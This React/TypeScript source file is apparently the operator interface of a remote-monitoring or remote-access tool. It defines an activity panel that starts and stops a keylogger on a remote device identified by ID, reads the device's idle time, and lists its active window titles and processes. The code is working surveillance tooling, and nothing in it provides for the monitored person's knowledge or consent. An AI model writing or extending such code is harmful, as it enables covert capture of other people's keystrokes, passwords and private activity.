import { useCallback, useEffect, useState } from "react";
import { toast } from "sonner";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import { Keyboard, Clock, AppWindow, RefreshCw } from "lucide-react";

type WindowEntry = { title: string; exe: string; ts: number };

export function ActivityPanel({ deviceId }: { deviceId: string }) {
  const { send, connected } = useDeviceCommands(deviceId);
  const [keylogging, setKeylogging] = useState(false);
  const [keyBuffer, setKeyBuffer] = useState("");
  const [idle, setIdle] = useState<number | null>(null);
  const [windows, setWindows] = useState<WindowEntry[]>([]);
  const [busy, setBusy] = useState(false);

  const toggleKeys = async () => {
    try {
      if (keylogging) {
        await send("activity.keys.stop");
        setKeylogging(false);
        toast.info("Keylogger stopped");
      } else {
        await send("activity.keys.start");
        setKeylogging(true);
        toast.info("Keylogger started");
      }
    } catch (e: any) {
      toast.error(e.message);
    }
  };

  const loadIdle = useCallback(async () => {
    try {
      const r = await send("activity.idle");
      setIdle(r.result?.seconds ?? null);
    } catch (e: any) {
      toast.error(e.message);
    }
  }, [send]);

  const loadWindows = useCallback(async () => {
    setBusy(true);
    try {
      const r = await send("activity.windows");
      setWindows((r.result?.windows as WindowEntry[]) ?? []);
    } catch (e: any) {
      toast.error(e.message);
    } finally {
      setBusy(false);
    }
  }, [send]);

  useEffect(() => {
    if (connected) {
      loadIdle();
      loadWindows();
    }
  }, [connected, loadIdle, loadWindows]);

  const formatIdle = (s: number) => {
    if (s < 60) return `${s}s`;
    if (s < 3600) return `${Math.floor(s / 60)}m ${s % 60}s`;
    return `${Math.floor(s / 3600)}h ${Math.floor((s % 3600) / 60)}m`;
  };

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-2 gap-4">
        <div className="rounded-xl border border-border/60 bg-card/60 p-4">
          <div className="flex items-center gap-2 text-muted-foreground">
            <Clock className="h-4 w-4" />
            <span className="text-xs uppercase tracking-wider font-semibold">Idle Time</span>
            <button
              onClick={loadIdle}
              disabled={!connected}
              className="ml-auto rounded border border-border/60 p-1 hover:bg-accent disabled:opacity-40"
            >
              <RefreshCw className="h-3 w-3" />
            </button>
          </div>
          <p className="mt-2 font-mono text-2xl">{idle !== null ? formatIdle(idle) : "—"}</p>
        </div>

        <div className="rounded-xl border border-border/60 bg-card/60 p-4">
          <div className="flex items-center gap-2 text-muted-foreground">
            <Keyboard className="h-4 w-4" />
            <span className="text-xs uppercase tracking-wider font-semibold">Keylogger</span>
          </div>
          <button
            onClick={toggleKeys}
            disabled={!connected}
            className={`mt-2 inline-flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition disabled:opacity-40 ${
              keylogging
                ? "bg-destructive/10 text-destructive border border-destructive/40"
                : "bg-primary/10 text-primary border border-primary/40"
            }`}
          >
            <Keyboard className="h-4 w-4" />
            {keylogging ? "Stop" : "Start"}
          </button>
          {keylogging && (
            <p className="mt-2 text-xs text-muted-foreground animate-pulse">
              Capturing keystrokes…
            </p>
          )}
        </div>
      </div>

      <div>
        <div className="mb-3 flex items-center gap-2">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">
            Active Windows
          </h3>
          <button
            onClick={loadWindows}
            disabled={!connected || busy}
            className="inline-flex items-center gap-1 rounded-md border border-border/60 px-2.5 py-1 text-xs transition hover:bg-accent disabled:opacity-40"
          >
            <RefreshCw className={`h-3 w-3 ${busy ? "animate-spin" : ""}`} /> Refresh
          </button>
        </div>
        <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
          <table className="w-full text-sm">
            <thead className="bg-muted/30 text-left text-xs uppercase tracking-wider text-muted-foreground">
              <tr>
                <th className="px-4 py-2.5 font-medium">Window Title</th>
                <th className="px-4 py-2.5 font-medium">Process</th>
                <th className="px-4 py-2.5 font-medium">Time</th>
              </tr>
            </thead>
            <tbody>
              {windows.length === 0 && (
                <tr>
                  <td colSpan={3} className="px-4 py-8 text-center text-muted-foreground">
                    {busy ? "loading…" : "no window data"}
                  </td>
                </tr>
              )}
              {windows.map((w, i) => (
                <tr key={i} className="border-t border-border/40 transition hover:bg-muted/20">
                  <td className="px-4 py-2 font-medium">{w.title || "(untitled)"}</td>
                  <td className="px-4 py-2 text-xs text-muted-foreground">{w.exe}</td>
                  <td className="px-4 py-2 text-xs text-muted-foreground">
                    {new Date(w.ts * 1000).toLocaleTimeString()}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
